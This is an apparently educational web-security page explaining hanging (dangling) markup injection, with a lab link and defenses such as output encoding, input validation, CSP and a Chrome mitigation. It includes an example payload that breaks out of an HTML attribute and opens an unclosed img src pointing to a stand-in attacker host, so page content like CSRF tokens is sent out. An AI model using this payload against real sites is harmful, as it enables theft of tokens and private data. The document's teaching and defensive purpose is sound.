## 🪝 Hanging Markup Injection

In this section, we explain how hanging markup injection occurs, how a typical exploit works, and how to prevent attacks using hanging markup.

### ❓ What is Hanging Markup Injection?

Hanging markup injection is a method of cross-domain data exfiltration in scenarios where a full-fledged cross-site scripting (XSS) attack is not possible.

### 🛡️ How to Prevent Hanging Markup Injection Attacks

You can prevent hanging markup injection attacks by applying the same general defenses used to prevent XSS, such as encoding output and validating input upon receipt.

Consider an application that insecurely injects attacker-controlled data into its responses:

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

Assume the application does not filter or escape characters like `>` or `"`. An attacker could use the following syntax to break out of the attribute value's quotes and the surrounding tag, returning to the HTML context:

```html
">
```

In this situation, the attacker would naturally attempt to execute XSS. However, assume that standard XSS attacks are not possible due to input filters, Content Security Policy (CSP), or other barriers. It may still be possible to perform a hanging markup injection attack using a payload like the following:

```html
"><img src='//attacker-website.com?
```

This payload creates an `<img>` tag and starts an `src` attribute containing a URL pointing to the attacker's server. Note that the attacker's payload does not close the `src` attribute, leaving it "hanging." When the browser parses the response, it looks ahead until it encounters a quote to close the attribute. Everything up to that point is treated as part of the URL and sent to the attacker's server in the query string of the URL. Any non-alphanumeric characters, including newlines, are URL-encoded.

📌 The result of the attack is that the attacker can capture part of the application's response after the injection point, which may contain sensitive data. Depending on the application's functionality, this could include CSRF tokens, email messages, or financial data.

### 🔗 Attributes for Hanging Markup Injection

Any attribute that makes an external request can be used for hanging markup injection.

This next lab is difficult to solve because all external requests are blocked. However, there are certain tags that allow you to store data and retrieve it later from an external server. Solving this lab may require user interaction.

[![Open Lab](https://img.shields.io/badge/Open-Lab-blue)](./01.%20%28Expert%29%20Reflected%20XSS%20protected%20by%20very%20strict%20CSP%2C%20with%20dangling%20markup%20attack.md)

You can also mitigate some hanging markup injection attacks by using a Content Security Policy (CSP). For example, you can prevent some (but not all) attacks by implementing a policy that disallows tags like `<img>` from loading external resources.

### 📝 Note

The Chrome browser has addressed hanging markup injection attacks by preventing `<img>` tags from defining URLs containing raw characters such as angle brackets and newlines. This blocks attacks because the data that would otherwise be exfiltrated typically contains these raw characters, causing the attack to fail.
